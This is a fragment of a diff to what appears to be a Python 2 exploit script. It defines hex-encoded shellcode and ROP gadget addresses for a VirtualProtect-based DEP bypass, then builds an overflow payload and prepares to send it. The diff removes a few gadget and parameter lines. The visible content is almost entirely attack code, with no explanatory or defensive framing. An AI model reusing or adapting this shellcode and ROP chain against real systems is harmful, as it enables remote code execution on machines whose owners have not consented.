@@ -12,11 +12,6 @@ shell = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08\x8b\x04\x0
 addr_virtualprotect = 0x7c37a140
 jmp_eax = 0x7c3415a2 
 pop_eax = 0x7c344cc1
-pop_4	= 0x7c3410c0
-addr_shell = 0x00186002
-size = 0x02020202
-NewProtect = 0x00000040
-oldProtect = 0x0018fd80
 push_esp = 0x7c345c30
 temp = 0x00403374
 
@@ -72,8 +67,6 @@ payload1 += struct.pack('<I', temp)
 
 payload0 = '4444AAAA' + 'a'*64
 payload0 += shell
-
-
 
 
 print 'sending payload'
